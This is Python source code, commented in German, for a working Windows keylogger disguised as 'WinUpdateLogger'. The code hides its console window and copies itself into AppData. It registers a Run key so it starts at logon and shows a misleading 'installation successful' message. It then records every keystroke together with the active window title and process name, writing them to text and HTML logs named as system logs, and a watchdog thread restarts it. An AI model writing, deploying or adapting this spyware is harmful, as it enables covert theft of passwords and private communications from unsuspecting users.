import os
import sys
import shutil
import datetime
import threading
from pynput import keyboard
import winreg
import time
import ctypes
import ctypes.wintypes
import psutil
import win32api #pywin
import win32con #pywin
import re


# Programmbezeichnungen
FILE_NAME = "winUpdateLogger.exe"   # im Verzeichnis
APP_NAME = "WinUpdateLogger"    # im TaskManager


# Zielpfade für Datei und Log
APP_PATH = os.path.join(os.getenv("APPDATA"), FILE_NAME)
LOG_PATH_TEXT = os.path.join(os.getenv("APPDATA"), "system_log.txt")
LOG_PATH_HTML = os.path.join(os.getenv("APPDATA"), "system_log.html")


# Zugriff auf Windows DLL
user32 = ctypes.windll.user32 # Benutzer-Interaktionen
kernel32 = ctypes.windll.kernel32 # Systemfunktionen


# Fenster verstecken
SW_HIDE = 0
console_window = ctypes.windll.kernel32.GetConsoleWindow()
if console_window:
    ctypes.windll.user32.ShowWindow(console_window, SW_HIDE)

# Herunterfahren erkennen
def on_shutdown(signal_type):
    if signal_type == win32con.CTRL_LOGOFF_EVENT or signal_type == win32con.CTRL_SHUTDOWN_EVENT:
        flush_current_line()
        close_html_log()
        with open(LOG_PATH_TEXT, "a", encoding="utf-8") as f:
            f.write(f"{datetime.datetime.now()} - System Shutdown/Logout erkannt. Keylogger gestoppt.\n")
    return True

win32api.SetConsoleCtrlHandler(on_shutdown, True)

# Systemfenster mit Benachrichtigung
# icon: 0x40 = i Hinweise, 0x10 = ! Error, 0x30 = ! Warnung, 0x20 = ? Frage
def show_message(title, text, icon):
    ctypes.windll.user32.MessageBoxW(0, text, title, icon)


# Kopiere Skript nach AppData, falls noch nicht vorhanden
if not os.path.exists(APP_PATH):
    shutil.copy(sys.argv[0], APP_PATH)

    try:
        # Mit CreateKey wird ein existierender Key verwendet oder ein neuer erzeugt, wenn keiner vorhanden (hier besser als OpenKey)
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run") as key:
            winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, APP_PATH)
    except Exception as e:
        print(f"Fehler beim Setzen des Autostart-Eintrags: {e}")
    # Verzögerung bevor Nachricht angezeigt wird
    time.sleep(2)
    # Zeige Info-Fenster bei erstmaliger "Installation"
    show_message("Installation erfolgreich", "Das Programm wurde erfolgreich installiert.", 0x40) 
else:
    time.sleep(2)
    show_message("Installation abgebrochen", "Das Programm ist bereits vorhanden oder es ist ein anderer Fehler aufgetreten.", 0x10)
    sys.exit(0)  # Skript beenden, bevor Logger startet


# =======================================
# =============== Logging ==============
# =======================================

# Variablen zum Speichern der Angaben
last_window_title = ""
last_process_name = ""
current_line = ""
lock = threading.Lock()


'''
    ==============================================================================
    ============================== HTML-Log-Struktur =============================
    ==============================================================================
'''

# HTML Grundstruktur
def init_html_log():
    with open(LOG_PATH_HTML, "w", encoding="utf-8") as f:
        f.write("""
                <!DOCTYPE html>
                <html lang="de">
                <head>
                <meta charset="UTF-8">
                <meta http-equiv="refresh" content="3">
                <title>Live Keylogger Log</title>
                <style>
                body { font-family: Consolas, monospace; background: #1e1e1e; color: #dcdcdc; padding: 20px; }
                h2 { color: #569cd6; }
                pre { background: #252526; padding: 10px; border-radius: 5px; }
                </style>
                </head>
                <body>
                <h1>Live Log</h1>
                """)

# Zeile ans HTML anhängen
def append_to_html(text):
    # Sondertasten fett hervorheben
    text = text.replace("[", "<b style='color:#f92672;'>[").replace("]", "]</b>")
    with open(LOG_PATH_HTML, "a", encoding="utf-8") as f:
        f.write(f"<pre>{text}</pre>\n")

# HTML abschließen
def close_html_log():
    with open(LOG_PATH_HTML, "a", encoding="utf-8") as f:
        f.write("</body></html>")

'''
    ==============================================================================
    ======================== Tastatur-Eingabe-Überwachung ========================
    ==============================================================================
'''

# Leere die aktuelle Eingabezeile @current_line
def flush_current_line():
    global current_line
    if current_line.strip():
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
        entry = f"{timestamp} - Eingaben:\n{current_line}\n"
        with open(LOG_PATH_TEXT, "a", encoding="utf-8") as f:
            f.write(entry)
        append_to_html(entry.replace("\n", "<br>"))
        current_line = ""

# Abfangen der Tastatureingabe
def on_press(key):
    global current_line

    # Tastatur-Eingaben
    try:
        if hasattr(key, 'char') and key.char: # hasattr(): Vermeide Fehler bei Sondertasten
            key_char = key.char
        else:
            if key == keyboard.Key.space: 
                key_char = " " # Leerzeichen als Leerzeichen einfügen
            elif key in [keyboard.Key.enter, keyboard.Key.tab]: 
                key_char = "\n" # Bei Enter oder Tab Zeilenumbruch
            elif key == keyboard.Key.backspace:
                if current_line:
                    current_line = current_line[:-1]  # löscht letztes Zeichen
                return  # kein Zeichen mehr anhängen oder loggen
            elif key == keyboard.Key.up:
                key_char = "[UP]"
            elif key == keyboard.Key.down:
                key_char = "[DOWN]"
            elif key == keyboard.Key.left:
                key_char = "[LEFT]"
            elif key == keyboard.Key.right:
                key_char = "[RIGHT]"
            else:
                # Sondertasten (z.B. Shift, F-Tasten, ...)
                # key_char = f"[{key.name.upper()}]"
                return
    except Exception as e:
        key_char = f"[UNKNOWN-{str(e)}]"

    current_line += key_char

    if key_char.endswith("\n"):
        flush_current_line()

# Logger starten
def start_logger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

'''
    ==============================================================================
    ======================== Fenster- / Titel-Überwachung ========================
    ==============================================================================
'''

# Ermittel den Titel des aktiven Fensters
def get_active_window_title():
    hwnd = user32.GetForegroundWindow() # Fenster im Vordergrund
    length = user32.GetWindowTextLengthW(hwnd) # Länge des Fenstertitels
    buff = ctypes.create_unicode_buffer(length + 1) # Puffer für Zwischenspeichern des Titel
    user32.GetWindowTextW(hwnd, buff, length + 1) # Titel holen und in Puffer speichern
    return buff.value

# Ermittel Prozess-ID des aktiven Fensters
def get_active_window_process():
    hwnd = user32.GetForegroundWindow() # Fenster im Vordergrund
    pid = ctypes.wintypes.DWORD() # leere 32-Bit Ganzzahl für Prozess-ID
    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid)) # Schreibt Prozess-ID des Fensters in pid
    try:
        process = psutil.Process(pid.value) # Prozess zur PID
        return process.name()
    except psutil.NoSuchProcess:
        return "Unbekannt"

# Nur Änderungen erfassen, die z.B. keine Statusanzeigen enthalten (lädt..., warten auf...)
def is_significant_title_change(old_title, new_title):
    """Überprüft, ob die Titeländerung wirklich relevant ist."""
    # Beides trimmen und in lowercase um echte Änderungen zu vergleichen
    old_clean = old_title.strip().lower()
    new_clean = new_title.strip().lower()

    # Wenn komplett gleich: keine Änderung
    if old_clean == new_clean:
        return False

    # Wenn alte oder neue Titel leer sind: Änderung (z.B. Fenster schließen/öffnen)
    if not old_clean or not new_clean:
        return True

    # Browser typische kleine Änderungen ignorieren
    ignore_patterns = [
        r"lädt", r"loading", r"aktualisieren", r"verbinden", r"warten", r"neu laden", r"refresh"
    ]
    for pattern in ignore_patterns:
        if re.search(pattern, old_clean) or re.search(pattern, new_clean):
            # z.B. "lädt..." → ignorieren
            return False

    # Normale echte Änderung erkannt
    return True

# Beobachtet Fensterwechsel unabhängig von Tastatureingaben
def monitor_window_changes():
    global last_window_title, last_process_name, current_line
    while True:
        time.sleep(1)  # Jede Sekunde prüfen
        title = get_active_window_title()
        process = get_active_window_process()

        # Titel und Prozessnamen bereinigen
        clean_title = title.strip()
        clean_last_title = last_window_title.strip()
        clean_process = process.strip()
        clean_last_process = last_process_name.strip()

        title_changed = is_significant_title_change(clean_last_title, clean_title)
        process_changed = clean_process != clean_last_process

        if title_changed or process_changed:
            with lock:
                # Bisherigen Eingabepuffer unter zuletzt aktivem Fenstertitel einfügen
                if current_line.strip():
                    # Aktueller Zeitstempel zum Eintrag
                    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
                    entry = f"{timestamp} - Eingaben: {current_line}\n"
                    # Letzte Eingaben aus Puffer ins Log übertragen
                    with open(LOG_PATH_TEXT, "a", encoding="utf-8") as f:
                        f.write(entry)
                    append_to_html(entry.replace("\n", "<br>"))
                    current_line = ""

                # Neuer Fensterwechsel
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
            header = f"\n========== [{timestamp}] ==========\nProzess: {process} | Fenstertitel: {title}\n"
            # Schreibe Info ins Log
            with open(LOG_PATH_TEXT, "a", encoding="utf-8") as f:
                f.write(header)
            append_to_html(f"<h2>{timestamp} - Prozess: {process} | Fenstertitel: {title}</h2>")

            # Fensterwechsel erfassen
            last_window_title = title
            last_process_name = process

# Funktion für Selbstheilung: Neustart des Skripts nach einem Absturz
def monitor_and_restart():
    while True:
        time.sleep(10)  # Alle 10 Sekunden prüfen
        if not any(thread.is_alive() for thread in threading.enumerate()):
            print(f"Prozess abgestürzt oder beendet! Neustart wird durchgeführt.")
            os.execv(sys.executable, ['python'] + sys.argv)  # Neustart des Skripts

# =======================================
# =========== Aktionen starten ==========
# =======================================

# HTML-Log starte
init_html_log()

# Logger-Thread starten
t1 = threading.Thread(target=start_logger, daemon=True)
t1.start()

# Fenster-Überwachungs-Thread starten
t2 = threading.Thread(target=monitor_window_changes, daemon=True)
t2.start()

# Überwachungs-Thread für Neustart
t3 = threading.Thread(target=monitor_and_restart, daemon=True)
t3.start()

# Haupt-Thread bleibt aktiv (damit das Script nicht sofort endet)
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    flush_current_line()
    close_html_log()
    # Vermerk im Log des Interrupts
    with open(LOG_PATH_TEXT, "a", encoding="utf-8") as f:
                f.write(f"{datetime.datetime.now()} - Interrupt | Keylogger gestoppt\n")